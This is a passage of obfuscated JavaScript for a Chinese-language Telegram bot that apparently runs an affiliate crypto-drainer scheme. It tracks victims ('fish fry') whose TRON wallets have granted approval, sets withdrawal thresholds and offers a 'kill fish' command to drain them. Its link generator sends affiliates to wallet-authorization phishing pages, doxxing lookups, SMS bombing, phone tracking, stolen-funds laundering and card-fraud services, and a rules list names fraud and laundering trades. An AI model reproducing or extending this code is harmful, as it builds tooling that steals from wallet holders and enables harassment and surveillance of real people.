              await M.sendMessage(y, "已为 " + hB + " " + hc + "，当前：" + hn.toFixed(2), hG);
            } catch (hQ) {
              console.error("performanceAdd error", hQ);
              const hT = {
                reply_to_message_id: p5
              };
              await M.sendMessage(y, "更新业绩失败，请稍后再试。", hT);
            }
            break;
          }
        case "performanceReset":
          {
            try {
              const {
                isAdmin: hD,
                isCreator: hH
              } = await checkGroupAdminStatus(M, y, t);
              if (!(hD || hH)) {
                break;
              }
              await ensurePerformanceTable();
              const hy = y.toString();
              await pool.promise().query("DELETE FROM " + PERF_TABLE + " WHERE groupid = ?", [hy]);
              const ht = {
                reply_to_message_id: p5
              };
              await M.sendMessage(y, "✅ 已删除本群业绩数据。", ht);
            } catch (hW) {
              console.error("performanceReset error", hW);
              const hm = {
                reply_to_message_id: p5
              };
              await M.sendMessage(y, "清零失败，请稍后再试。", hm);
            }
            break;
          }
        default:
          {
            console.log("[" + getTimeInfo().time + "] 未识别的命令类型：" + pp.type);
          }
      }
    } catch (j2) {
      console.error("[" + getTimeInfo().time + "] 消息处理错误:", j2);
      await M.sendMessage(k.chat.id, "❌ 处理命令时出现错误，请稍后重试。", {
        reply_to_message_id: k.message_id
      });
    }
  });
}
const g = {
  help: /^(?:帮助|help|菜单|指令|命令)$/,
  threshold: /^(?:修改阈值|阈值修改|阈值|修改阀值|阀值修改|阀值)\s*(?:T[1-9A-HJ-NP-Za-km-z]{33})\s*([0-9.]+)$/,
  killFish: /^杀鱼\s*(?:T[1-9A-HJ-NP-Za-km-z]{33})$/,
  paymentAddress: /^(?:收款地址|设置地址|设置收款地址)\s*(?:T[1-9A-HJ-NP-Za-km-z]{33})$/,
  queryPaymentAddress: /^收款地址$/,
  myFish: /^(?:我的|我的鱼苗|鱼苗|鱼池)$/,
  proxy: /^(?:代理|代理链接|链接|商城|发卡)$/,
  autoThreshold: /^(?:自动阈值|设置自动阈值|全局阈值|设置阈值|设置阀值|自动阀值|设置自动阀值|全局阀值)\s*([0-9.]+)$/,
  price: /^🏦汇率查询$|^汇率$|^usdt$|^USDT$|^L$|^l$|^\d+[uU]$|^[Zz]\d{1,10}$/,
  trx: /^🪫TRX 闪兑$|^闪兑$|^trx$|^TRX$|^TRC$|^trc$/,
  energy: /^🔋能量租赁$|^能量租赁$|^能量$/,
  id: /^ID查询$|^telegramid$|^id查询$|^查询ID$|^查询id$|^🔍TGID查询$/,
  botCommands: /^(?:机器人|担保|汇旺|新币)$/,
  rules: /^(?:规则|交易规则|担保交易规则|担保规则)$/,
  addressCheck: /^(?:T[1-9A-HJ-NP-Za-km-z]{33})$/
};
const isCalculator = j => {
    if (!j || !/^[\d\+\-\*/\%\(\)\. =xX÷％]+$/.test(j)) {
      return false;
    }
    if (/^\d+$/.test(j)) {
      return false;
    }
    let w = j.split("=")[0].replace(/x/gi, "*").replace(/÷/g, "/").replace(/％/g, "%").trim();
    if (!/^[\d\(]/.test(w) || !/[\d\)]$/.test(w)) {
      return false;
    }
    return /[\+\-\*/\%]/.test(w);
  },
  violationCounts = new Map();
async function handleClassModeAndGroupState(a, z, l, b, I = null, F = null, U = null) {
  try {
    function K(L) {
      for (const N of violationCounts.keys()) {
        if (N.startsWith(L + ":")) {
          violationCounts.delete(N);
        }
      }
    }
    if (I) {
      switch (I) {
        case "getStatus":
          const L = cacheData.dailiGroupMap.get(z);
          return L?.["status"] === 0;
        case "setStatus":
          const Y = F ? 0 : 1;
          await pool.promise().query("UPDATE daili_group SET status = ? WHERE groupid = ?", [Y, z]);
          const V = cacheData.dailiGroupMap.get(z);
          if (V) {
            V.status = Y;
            cacheData.dailiGroupMap.set(z, V);
          }
          if (!F) {
            K(z);
          }
          break;
        case "getViolation":
          return violationCounts.get(z + ":" + F) || 0;
        case "addViolation":
          const N = (violationCounts.get(z + ":" + F) || 0) + 1;
          violationCounts.set(z + ":" + F, N);
          return N;
        case "resetViolation":
          violationCounts.delete(z + ":" + F);
          break;
        case "clearViolations":
          K(z);
          break;
        case "handleViolation":
          const r = await handleClassModeAndGroupState(a, z, null, null, "addViolation", F),
            B = "🤐 下课期间，禁止发送非命令消息，第" + r + "次警告，违规3次以上将禁言处理",
            R = {
              reply_to_message_id: U
            };
          const f = await a.sendMessage(z, B, R);
          try {
            await a.deleteMessage(z, U);
          } catch (G) {
            console.error("[" + getTimeInfo().time + "] 在 " + z + " 群删除客户消息失败:", G);
          }
          setTimeout(async () => {
            try {
              await a.deleteMessage(z, f.message_id);
            } catch (o) {
              console.error("[" + getTimeInfo().time + "] 在 " + z + " 群删除警告消息失败:", o);
            }
          }, 3000);
          if (r >= 3) {
            try {
              const o = {
                can_send_messages: false,
                can_send_media_messages: false,
                can_add_web_page_previews: false,
                can_change_info: false,
                can_invite_users: false
              };
              await a.restrictChatMember(z, F, o, 3);
              await handleClassModeAndGroupState(a, z, null, null, "resetViolation", F);
            } catch (Q) {
              console.error("[" + getTimeInfo().time + "] 在 " + z + " 群限制用户禁言失败:", Q);
            }
          }
          return false;
        default:
          break;
      }
      if (!l) {
        return;
      }
    }
    if (!l) {
      return false;
    }
    const q = l.from.id,
      P = await checkGroupAdminStatus(a, z, q),
      O = P.isAdmin || P.isCreator;
    if (!O) {
      return false;
    }
    const s = b === "下课";
    await handleClassModeAndGroupState(a, z, null, null, "setStatus", s);
    const d = "下课成功，下课期间禁止闲聊，仅允许发送以下命令：\n    \n🌐<code>代理</code>（<u>获取推广链接</u>）\n\n🐟<code>鱼苗</code>（<u>查看自己的鱼苗</u>）\n\n💰<code>收款地址</code>（<u>查看自己的收款地址</u>）\n\n💳收款地址+地址（<u>绑定自己的收款地址</u>）\n例：<code>收款地址 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>\n\n⚔️杀鱼+鱼苗地址（<u>杀鱼命令</u>）\n例：<code>杀鱼 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>\n\n⚙️自动阈值+新的自动阈值（<u>授权后自动设置的阈值</u>）\n例：<code>自动阈值 5000</code>\n\n🔏阈值+鱼苗地址+新的阈值（<u>修改提币阈值</u>）\n例：<code>阈值 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 10000</code>",
      A = s ? d : "🎣 新的一天开始，预祝大家今天杀鱼多多",
      M = {};
    M.parse_mode = "HTML";
    await a.sendMessage(z, A, M);
    return true;
  } catch (k) {
    console.error("[" + getTimeInfo().time + "] 在 " + z + " 群处理上课/下课错误:", k);
    if (I === "getStatus") {
      return false;
    }
    return false;
  }
}
function generateTradeRulesMessage() {
  const w = {
    tAFsL: function (l, b) {
      return l === b;
    },
    XgliE: "ASnYJ",
    LwGwX: "常规卡卡交易",
    qvUsz: "大混卡卡交易",
    PylkQ: "常规回U交易",
    SgLpy: "大混回U交易",
    KCmHF: "常规码回U交易",
    vQVul: "一道常规码接交易",
    mlwhu: "公檢法進算",
    UwzNB: "BC料收付一体",
    NsZhm: "BC料代收",
    mCNzj: "纯BC充U代付",
    DCglH: "充U代付交易",
    LHXti: "卡接一道进算",
    wEXWN: "资金盘一道交易",
    rnYgD: "京东小时达",
    SlznO: "话费卡",
    UKLca: "实物小时达",
    AtBkC: "二道常规交易",
    xVmCE: "油卡充值卡",
    tIfFA: "码接二道常规料",
    rXRvt: "精聊二道",
    ZIXuK: "一道色料码接",
    gPVEn: "口令红包",
    IiKDo: "一道微信群转账进算",
    guxgB: "码接二道色料",
    uFKTo: "二道数字人民币",
    bXZPA: "话费卡核销",
    PFtEN: "京东E卡",
    MyfFo: "支付宝口令代收",
    PMvRd: "充值话费交易",
    zHReU: "纯BC代付交易",
    YEzhi: "码接二道精聊回U",
    ZYQnj: "日本私户规则",
    gOhbX: "资金盘前中期二道料",
    ixtst: "资金盘一道交易规则",
    xidcd: "大区二道",
    XBWGG: "钉钉群收款",
    rSEZb: "钉钉红包常规",
    bmfvn: "一道常规网关进算",
    nTMbx: "纯白资U兑换一道盗刷U",
    xEUIq: "精料无卡取现",
    pnlKL: "承兑支付宝微信码接回u",
    VYRjT: "搭建机器人/网站交易",
    vPwXb: "抖币快币代充",
    MfIDw: "黄金/苹果手机",
    BUibs: "📜 以下规则仅供参考：\n\n"
  };
  const J = w,
    a = [[J.LwGwX, 33, J.qvUsz, 34, J.PylkQ, 35], [J.SgLpy, 36, J.KCmHF, 37, J.vQVul, 38], [J.mlwhu, 39, J.UwzNB, 40, J.NsZhm, 41], [J.mCNzj, 42, J.DCglH, 43, J.LHXti, 44], [J.wEXWN, 45, J.rnYgD, 46, J.SlznO, 47], [J.UKLca, 48, J.AtBkC, 49, J.xVmCE, 50], [J.tIfFA, 51, J.rXRvt, 52, J.ZIXuK, 53], [J.gPVEn, 54, J.IiKDo, 55, J.guxgB, 56], [J.uFKTo, 57, J.bXZPA, 58, J.PFtEN, 60], [J.MyfFo, 84, J.PMvRd, 66, J.zHReU, 83], [J.YEzhi, 79, J.ZYQnj, 75, J.rXRvt, 89], [J.gOhbX, 86, J.ixtst, 64, J.xidcd, 74], [J.XBWGG, 73, J.rSEZb, 65, J.bmfvn, 78], ["快手", 71, J.nTMbx, 69, J.xEUIq, 72], [J.pnlKL, 85, J.VYRjT, 68, J.vPwXb, 62], ["克隆", 63, "查档", 80, J.MfIDw, 87]];
  let z = J.BUibs;
  a.forEach(l => {
    if (J.tAFsL(J.XgliE, J.XgliE)) {
      z += "<a href=\"https://t.me/tianhui654/" + l[1] + "\"><u>" + l[0] + "</u></a> | <a href=\"https://t.me/tianhui654/" + l[3] + "\"><u>" + l[2] + "</u></a> | <a href=\"https://t.me/tianhui654/" + l[5] + "\"><u>" + l[4] + "</u></a>\n";
    } else {
      const I = {
        trcid: a,
        deeplink: ""
      };
      J = I;
    }
  });
  return z;
}
function generateHelpMessage() {
  return "📖 <b>常用命令帮助</b>\n\n🌐 <b>代理</b>（获取推广链接）\n\n🐟 <b>鱼苗</b>（查看自己的鱼苗）\n\n💰 <b>收款地址</b>（查看自己的收款地址）\n\n💳 <b>收款地址 + 地址</b>（绑定自己的收款地址）\n例：<code>收款地址 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>\n\n⚔️ <b>杀鱼 + 鱼苗地址</b>（杀鱼命令）\n例：<code>杀鱼 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code>\n\n🔏 <b>阈值 + 鱼苗地址 + 新的阈值</b>（修改提币阈值）\n例：<code>阈值 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 10000</code>\n\n🏦 <b>收银 + 金额</b>（获取专属的收银台）\n例：<code>收银 1000</code>";
}
async function checkGroupAdminStatus(J, a, z) {
  try {
    const I = await J.getChatMember(a, z),
      F = await J.getChatAdministrators(a),
      U = I.status === "creator",
      u = F.some(q => q.user.id === z),
      K = {
        isCreator: U,
        isAdmin: u,
        status: I.status
      };
    return K;
  } catch (q) {
    const E = {
      isCreator: false,
      isAdmin: false,
      status: "member"
    };
    return E;
  }
}
async function handlePaymentRequest(l, b, I) {
  try {
    const u = b.from.id.toString(),
      K = l.toString();
    let q = null;
    for (const [N, r] of cacheData.dailiMap) {
      if (r.tguid && r.tguid.toString() === u && r.groupid && r.groupid.toString() === K) {
        q = r;
        break;
      }
    }
    if (!q) {
      const f = {
        text: "⛔️ 请先注册成为代理后再使用收银台功能",
        options: {}
      };
      f.options.parse_mode = "HTML";
      return f;
    }
    const E = cacheData.options.main_domain;
    if (!E) {
      const n = {
        text: "❌ 系统配置错误，请联系管理员",
        options: {}
      };
      n.options.parse_mode = "HTML";
      return n;
    }
    const P = E + "/pay?id=" + q.unique_id + "&amount=" + I.toFixed(6),
      O = new Date(),
      s = new Date(O.getTime() + 600000),
      d = G => {
        const o = G.getFullYear(),
          i = String(G.getMonth() + 1).padStart(2, "0"),
          Q = String(G.getDate()).padStart(2, "0"),
          T = String(G.getHours()).padStart(2, "0"),
          C = String(G.getMinutes()).padStart(2, "0");
        return o + "-" + i + "-" + Q + " " + T + ":" + C;
      },
      A = d(O),
      M = d(s),
      L = "<b>订单创建成功✅</b>\n<b>金额: </b><code>" + I + "</code> <b>USDT</b>\n<b>💰收银台：</b><a href=\"" + P + "\"><u>立即付款</u></a>\n<b>订单创建时间：</b><code>" + A + "</code>\n<b>订单结束时间：</b><code>" + M + "</code>",
      Y = {};
    Y.parse_mode = "HTML";
    Y.disable_web_page_preview = true;
    const V = {};
    V.text = L;
    V.options = Y;
    return V;
  } catch (G) {
    console.error("[" + getTimeInfo().time + "] 处理收款请求错误:", G);
    const S = {
      text: "❌ 处理收款请求时出现错误，请稍后重试",
      options: {}
    };
    S.options.parse_mode = "HTML";
    return S;
  }
}
async function getFishMessage(a, z) {
  try {
    const b = z.from.id,
      I = z.from.first_name + (z.from.last_name ? " " + z.from.last_name : ""),
      F = getTimeInfo(),
      U = 10,
      u = Array.from(cacheData.dailiMap.values()).find(d => d.tguid === b.toString() && d.groupid === a.toString());
    if (!u) {
      return {
        text: "🎣渔夫 <code>" + I + "</code> " + F.greeting + "！\n\n" + "📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。",
        options: {
          parse_mode: "HTML",
          reply_to_message_id: z.message_id
        }
      };
    }
    const K = Array.from(cacheData.fishMap.values()).filter(A => A.unique_id === u.unique_id && A.auth_status === 1).sort((A, M) => A.id - M.id);
    if (K.length === 0) {
      return {
        text: "🎣渔夫 " + I + " " + F.greeting + "！\n\n" + "🐟您的鱼池为空，请继续加油吧，答应我一定要赚够多多的uu！",
        options: {
          parse_mode: "HTML",
          reply_to_message_id: z.message_id,
          reply_markup: {
            inline_keyboard: [[{
              text: "✅ 退出查询",
              callback_data: "fish_close_" + u.unique_id
            }]]
          }
        }
      };
    }
    let q = "🎣渔夫 <code>" + I + "</code> " + F.greeting + "！\n\n" + ("共计 <code>" + K.length + "</code> 条鱼苗（第<code>1</code>页）\n\n");
    const E = K.slice(0, U);
    E.forEach((M, L) => {
      const V = L + 1,
        N = Number(M.usdt_balance).toFixed(6),
        r = Number(M.threshold).toFixed(6);
      q += "🐟鱼苗<code>" + V + "</code>号：<code>" + M.fish_address + "</code>\n" + ("📤提币阈值：<code>" + r + "</code>\n") + ("💸USDT余额：<code>" + N + "</code>\n\n");
    });
    const P = {
        inline_keyboard: K.length > U ? [[{
          text: "➡️下一页",
          callback_data: "fish_page_" + u.unique_id + "_2"
        }, {
          text: "✅ 退出查询",
          callback_data: "fish_close_" + u.unique_id
        }]] : [[{
          text: "✅ 退出查询",
          callback_data: "fish_close_" + u.unique_id
        }]]
      },
      O = {
        parse_mode: "HTML",
        reply_to_message_id: z.message_id,
        reply_markup: P
      };
    const s = {
      text: q,
      options: O
    };
    return s;
  } catch (L) {
    console.error("[" + getTimeInfo().time + "] 查询鱼池信息错误:", L);
    const V = {
      text: "❌ 查询鱼池信息时出现错误，请联系管理员。",
      options: {}
    };
    V.options.parse_mode = "HTML";
    V.options.reply_to_message_id = z.message_id;
    return V;
  }
}
async function adminQueryUserFish(b, I, F, U) {
  try {
    const K = I.from.id,
      q = I.from.first_name + (I.from.last_name ? " " + I.from.last_name : ""),
      E = getTimeInfo(),
      {
        isAdmin: P,
        isCreator: O
      } = await checkGroupAdminStatus(U, b, K);
    if (!P && !O) {
      return null;
    }
    const s = Array.from(cacheData.dailiMap.values()).filter(B => B.groupid === b.toString()),
      d = s.find(B => B.username && B.username.toLowerCase() === F.toLowerCase());
    if (!d) {
      const B = {
        parse_mode: "HTML",
        reply_to_message_id: I.message_id
      };
      const R = {
        text: "❌ 未找到用户 @" + F + " 的鱼苗信息。",
        options: B
      };
      return R;
    }
    let A = "",
      M = "";
    if (d.fullName) {
      const X = d.fullName.split(" ");
      A = X[0] || "";
      M = X[1] || "";
    }
    const L = {};
    L.id = d.tguid;
    L.first_name = A;
    L.last_name = M;
    L.username = d.username;
    const Y = {
      ...I,
      from: L
    };
    const N = await getFishMessage(b, Y);
    if (N && N.text) {
      const c = d.fullName || d.username || "Unknown",
        G = "🎣渔夫 <code>" + c + "</code> " + E.greeting + "！",
        S = "👮‍♂️ 管理员 <code>" + q + "</code> " + E.greeting + "！\n\n当前正在查询用户: @" + d.username;
      N.text = N.text.replace(G, S);
      if (N.options && N.options.reply_markup && N.options.reply_markup.inline_keyboard) {
        const o = N.options.reply_markup.inline_keyboard;
        for (let Q = 0; Q < o.length; Q++) {
          for (let T = 0; T < o[Q].length; T++) {
            const v = o[Q][T];
            if (v.callback_data && !v.callback_data.includes("_admin")) {
              v.callback_data = v.callback_data + "_admin";
            }
          }
        }
      }
    }
    return N;
  } catch (y) {
    console.error("[" + getTimeInfo().time + "] 管理员查询用户鱼苗错误:", y);
    const p4 = {
      text: "❌ 查询用户鱼苗信息时出现错误。",
      options: {}
    };
    p4.options.parse_mode = "HTML";
    p4.options.reply_to_message_id = I.message_id;
    return p4;
  }
}
async function handleFishCallback(b) {
  try {
    const U = b.message.chat.id,
      u = b.from.id,
      K = b.message.message_id,
      q = b.data.split("_"),
      P = q[1],
      O = q[2],
      s = q.includes("admin"),
      d = s ? parseInt(q[q.indexOf("admin") - 1]) : parseInt(q[3]),
      A = await checkGroupAdminStatus(bot, U, u),
      M = A.isAdmin || A.isCreator;
    if (s && !M) {
      const Y = {
        text: "⛔️ 您无权操作本条消息，只有管理员可以操作",
        show_alert: true
      };
      await bot.answerCallbackQuery(b.id, Y);
      return;
    }
    if (!s) {
      const N = Array.from(cacheData.dailiMap.values()).find(r => r.tguid === u.toString() && r.groupid === U.toString());
      if (!N || N.unique_id !== O && !M) {
        const B = {
          text: "⛔️ 您无权操作本条消息",
          show_alert: true
        };
        await bot.answerCallbackQuery(b.id, B);
        return;
      }
    }
    if (P === "close") {
      await bot.deleteMessage(U, K);
      await bot.answerCallbackQuery(b.id);
      return;
    }
    if (P === "page") {
      const f = d,
        X = 10,
        n = Array.from(cacheData.fishMap.values()).filter(x => x.unique_id === O && x.auth_status === 1).sort((x, k) => x.id - k.id),
        c = (f - 1) * X,
        G = n.slice(c, c + X),
        S = cacheData.dailiMap.get(O);
      let e;
      if (s) {
        e = "📊 管理员查询：用户 @" + S.username + " 的鱼池信息：\n\n" + ("总计：<code>" + n.length + "</code> 条鱼苗（第<code>" + f + "</code>页）\n\n");
      } else {
        const D = b.from.first_name + (b.from.last_name ? " " + b.from.last_name : "");
        e = "🎣渔夫 <code>" + D + "</code> " + getTimeInfo().greeting + "！\n\n" + ("共计 <code>" + n.length + "</code> 条鱼苗（第<code>" + f + "</code>页）\n\n");
      }
      G.forEach((H, y) => {
        const p6 = c + y + 1,
          p7 = Number(H.usdt_balance).toFixed(6),
          p8 = Number(H.threshold).toFixed(6);
        e += "🐟鱼苗<code>" + p6 + "</code>号：<code>" + H.fish_address + "</code>\n" + ("📤提币阈值：<code>" + p8 + "</code>\n") + ("💸USDT余额：<code>" + p7 + "</code>\n\n");
      });
      const o = {};
      o.inline_keyboard = [];
      const i = o,
        Q = c + X < n.length,
        T = f > 1,
        C = s ? "_admin" : "";
      if (T && Q) {
        i.inline_keyboard = [[{
          text: "⬅️上一页",
          callback_data: "fish_page_" + O + "_" + (f - 1) + C
        }, {
          text: "➡️下一页",
          callback_data: "fish_page_" + O + "_" + (f + 1) + C
        }], [{
          text: "✅ 关闭",
          callback_data: "fish_close_" + O + C
        }]];
      } else {
        if (Q) {
          i.inline_keyboard = [[{
            text: "➡️下一页",
            callback_data: "fish_page_" + O + "_" + (f + 1) + C
          }, {
            text: "✅ 关闭",
            callback_data: "fish_close_" + O + C
          }]];
        } else {
          if (T) {
            i.inline_keyboard = [[{
              text: "⬅️上一页",
              callback_data: "fish_page_" + O + "_" + (f - 1) + C
            }, {
              text: "✅ 关闭",
              callback_data: "fish_close_" + O + C
            }]];
          } else {
            const p5 = {
              text: "✅ 关闭",
              callback_data: "fish_close_" + O + C
            };
            i.inline_keyboard = [[p5]];
          }
        }
      }
      const v = {};
      v.chat_id = U;
      v.message_id = K;
      v.parse_mode = "HTML";
      v.reply_markup = i;
      await bot.editMessageText(e, v);
      await bot.answerCallbackQuery(b.id);
    }
  } catch (p7) {
    console.error("[" + getTimeInfo().time + "] 处理鱼苗回调错误:", p7);
    const p8 = {
      text: "查看鱼苗时出现错误，请联系管理员",
      show_alert: true
    };
    await bot.answerCallbackQuery(b.id, p8);
  }
}
async function generateUniqueId(j) {
  const J = "abcdefghijklmnopqrstuvwxyz0123456789";
  function a() {
    let I = "";
    for (let F = 0; F < 11; F++) {
      I += J.charAt(Math.floor(Math.random() * J.length));
    }
    return I;
  }
  const z = a();
  const [l] = await j.promise().query("SELECT id FROM daili WHERE unique_id = ?", [z]);
  if (l.length === 0) {
    return z;
  }
  return generateUniqueId(j);
}
async function getDomainMessage(I, F) {
  try {
    if (!F.from.username) {
      const G = {
        text: "❌ 请先创建你的用户名才能继续申请代理链接",
        options: {}
      };
      return G;
    }
    const u = F.from.id,
      K = F.from.username,
      q = F.from.first_name + (F.from.last_name ? " " + F.from.last_name : ""),
      E = getTimeInfo(),
      P = F.chat.id.toString(),
      [O] = await pool.promise().query("SELECT * FROM daili WHERE tguid = ? AND groupid = ?", [u.toString(), P]);
    if (!O.length) {
      try {
        const e = await generateUniqueId(pool);
        await pool.promise().query("INSERT INTO daili (tguid, username, fullName, time, groupid, unique_id) VALUES (?, ?, ?, ?, ?, ?)", [u, K, q, E.time, P, e]);
      } catch (o) {
        console.error("[" + getTimeInfo().time + "] 创建代理记录失败:", o);
        const i = {
          text: "❌ 创建代理记录时出现错误，请联系管理员。",
          options: {}
        };
        return i;
      }
    } else {
      await pool.promise().query("UPDATE daili SET username = ?, fullName = ? WHERE tguid = ? AND groupid = ?", [K, q, u, P]);
    }
    const [s] = await pool.promise().query("SELECT threshold, payment_address, unique_id, time FROM daili WHERE tguid = ? AND groupid = ?", [u.toString(), P]),
      d = s[0] || {},
      A = d.threshold || DEFAULT_AUTO_THRESHOLD,
      M = d.unique_id,
      L = d.payment_address || "当前未设置，可使用【收款地址】进行设置",
      V = Array.from(cacheData.fishMap.values()).filter(Q => String(Q.unique_id) === String(M) && Number(Q.auth_status) === 1).length,
      N = function (Q) {
        if (Q < 1) {
          return "青铜";
        }
        if (Q < 5) {
          return "白银";
        }
        if (Q < 10) {
          return "黄金";
        }
        if (Q < 20) {
          return "钻石";
        }
        return "大师";
      }(V);
    let r = cacheData.options.main_domain || "";
    if (!r) {
      const Q = {
        text: "❌ 未找到主域名配置，请联系管理员在后台设置主域名。",
        options: {}
      };
      return Q;
    }
    r = r.endsWith("/") ? r.slice(0, -1) : r;
    const B = "?id=" + M,
      R = {
        shop: "" + r + B,
        goods: r + "/netshop/pay.html" + B + "&pid=1",
        tuihuo: r + "/netshop/pay.html" + B + "&pid=91",
        trx: r + "/trx" + B,
        sgk: r + "/sgk" + B,
        hsn: r + "/hsn" + B,
        tk: r + "/tk" + B,
        sw: r + "/sw" + B,
        yzjh: r + "/yanzheng" + B,
        xinbi: r + "/xinbi" + B,
        hwdb: r + "/hwdb" + B,
        tddb: r + "/tddb" + B,
        dydb: r + "/dydb" + B,
        netsms: r + "/netsms" + B,
        netshop: r + "/netshop" + B,
        paofen: r + "/paofen" + B,
        Uband: r + "/Uband" + B,
        tgvip: r + "/tgvip" + B,
        phone: r + "/phone" + B,
        energy: r + "/energy" + B,
        wk: r + "/wk" + B,
        map: r + "/map" + B,
        HBbot: "https://t.me/Okay_PayBot?start=" + M,
        FKbot: "https://t.me/wuyouhaopu_bot?start=" + M
      };
    const X = "🎣渔夫 <code>" + q + "</code> " + E.greeting + "！\n" + ("🐟鱼苗数量：<code>" + V + "</code> | 🏅等级：<code>" + N + "</code>\n") + ("⚜️授权成功后自动设置阈值：<code>" + A + "</code>\n") + ("<pre>" + L + "</pre>\n") + "————————————\n" + ("🛍 <a href=\"" + R.shop + "\">点击访问繁体商城</a>\n") + "————————————\n" + ("🧬 <a href=\"" + R.netshop + "\">点击访问发卡商城</a>\n") + "————————————\n" + "✈️飞机自助商城机器人⤵️\n" + "————————————\n" + ("🦋 <a href=\"" + R.FKbot + "\">无忧号铺 24小时自动发货</a>\n") + "————————————\n" + "机器人提货下单码 '985159'\n" + "————————————\n" + "📦 提货：\n" + ("🧬➽<a href=\"" + R.goods + "\">订单提货链接0.1U</a>\n") + "📦 退货：\n" + ("🧬➽<a href=\"" + R.tuihuo + "\">订单退货链接0.1U</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🧧okpay红包机器人➽最新\n" + ("🧬 <a href=\"" + R.HBbot + "\">点击访问红包机器人</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🚗 跑分平台授权➽独家首发\n" + ("🧬  <a href=\"" + R.paofen + "\">跑分订单大厅链接</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🎢 挖矿授权➽全新升级\n" + ("🧬  <a href=\"" + R.wk + "\">智能挖矿点击链接</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🔋能量租赁➽TRX闪兑\n" + ("🔗点击；<a href=\"" + R.trx + "\">实时汇率兑换</a>\n") + "🪫能量租赁➽误转退款\n" + ("🔗点击；<a href=\"" + R.tk + "\">能量租赁退款</a>\n") + "🔻波场返还➽手续费返还\n" + ("🔗点击；<a href=\"" + R.energy + "\">申请退返平台</a>\n") + "————————————\n" + "🪱 全球短信接码平台•\n" + ("🧬点击➽<a href=\"" + R.netsms + "\">全球短信接码</a>\n\n") + "🦺TG会员闪充平台•\n" + ("🧬点击➽<a href=\"" + R.tgvip + "\">进入TG会员闪充</a>\n\n") + "⛽️三网手机7折充值•\n" + ("🧬点击➽<a href=\"" + R.phone + "\">进入手机充值平台</a>\n\n") + "🎱黑U绑定承兑登记•\n" + ("🧬点击➽<a href=\"" + R.Uband + "\">进入黑U绑定登记</a>\n\n") + "🛍 实物车快递信息登记•\n" + ("🧬点击➽<a href=\"" + R.sw + "\">实物车收货登记</a>\n\n") + "🧧钱包验证激活授权•\n" + ("🧬点击➽<a href=\"" + R.yzjh + "\">进入钱包验证激活</a>\n") + "————————————\n" + "🛡 纠纷退押处理•\n" + ("新币担保➽<a href=\"" + R.xinbi + "\">退押登记</a>\n") + ("土豆退款➽<a href=\"" + R.tddb + "\">退押登记</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🔍社工库»开房记录\n" + ("🧬社工查询：<a href=\"" + R.sgk + "\">付费查询</a>\n") + "📱短信轰炸»手机轰炸»\n" + ("🧬短信轰炸：<a href=\"" + R.hsn + "\">轰炸网站</a>\n") + "📱手机类»手机定位追踪»\n" + ("🧬手机定位：<a href=\"" + R.map + "\">点击定位</a>\n") + "➖➖➖➖➖➖➖➖\n" + "🔰<b>发送  im 获取收款码</b>\n" + "🔰<b>发送  tp 获取收款码</b>\n" + "❇️<b>收银+金额 获取专属订单收银台！</b>\n\n",
      n = {
        parse_mode: "HTML",
        reply_to_message_id: F.message_id,
        disable_web_page_preview: false
      };
    const c = {
      text: X,
      options: n
    };
    return c;
  } catch (T) {
    console.error("[" + getTimeInfo().time + "] 处理代理链接错误:", T);
    const C = {
      text: "❌ 生成代理链接时出现错误，请联系管理员。",
      options: {}
    };
    return C;
  }
}
let __perfTableReady = false,
  __perfMigratedOnce = false;
const PERF_TABLE = "daili_performance_v2";
async function ensurePerformanceTable() {
  if (__perfTableReady) {
    return true;
  }
  try {
    await pool.promise().query("CREATE TABLE IF NOT EXISTS " + PERF_TABLE + " (\n        id BIGINT AUTO_INCREMENT PRIMARY KEY,\n        groupid VARCHAR(64) NOT NULL,\n        nickname VARCHAR(128) NOT NULL,\n        value DECIMAL(18,2) NOT NULL DEFAULT 0,\n        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,\n        UNIQUE KEY uniq_gid_nickname (groupid, nickname)\n      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
    if (!__perfMigratedOnce) {
      __perfMigratedOnce = true;
      try {
        const [a] = await pool.promise().query("SHOW TABLES LIKE 'daili_performance'");
        if (a && a.length) {
          const [z] = await pool.promise().query("SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'daili_performance'"),
            l = new Set((z || []).map(I => String(I.COLUMN_NAME || "").toLowerCase())),
            b = l.has("nickname") ? "nickname" : l.has("username") ? "username" : null;
          b && (await pool.promise().query("INSERT INTO " + PERF_TABLE + " (groupid, nickname, value)\n               SELECT groupid, " + b + " AS nickname, SUM(value) AS value\n               FROM daili_performance\n               WHERE " + b + " IS NOT NULL AND TRIM(" + b + ") <> ''\n               GROUP BY groupid, " + b + "\n               ON DUPLICATE KEY UPDATE value = " + PERF_TABLE + ".value + VALUES(value)"));
        }
      } catch (I) {
        console.error("ensurePerformanceTable migrate to v2 error", I);
      }
    }
    __perfTableReady = true;
    return true;
  } catch (F) {
    console.error("ensurePerformanceTable error", F);
    return false;
  }
}
async function addPerformance(j, w, J) {
  const z = String(w || "").trim();
  if (!z) {
    return 0;
  }
  await pool.promise().query("INSERT INTO " + PERF_TABLE + " (groupid, nickname, value) VALUES (?, ?, ?) ON DUPLICATE KEY UPDATE value = value + VALUES(value)", [j.toString(), z, Number(J) || 0]);
  const {
    value: l
  } = await getPerformanceValue(j, z);
  return Number(l || 0);
}
async function getPerformanceValue(J, a) {
  const l = String(a || "").trim();
  const b = {
    value: 0
  };
  if (!l) {
    return b;
  }
  const [I] = await pool.promise().query("SELECT value FROM " + PERF_TABLE + " WHERE groupid = ? AND nickname = ? LIMIT 1", [J.toString(), l]),
    F = {
      value: 0
    };
  return I && I[0] ? I[0] : F;
}
async function getLeaderboard(j, w = 10) {
  const a = j.toString(),
    z = Number(w);
  if (Number.isFinite(z) && z > 0) {
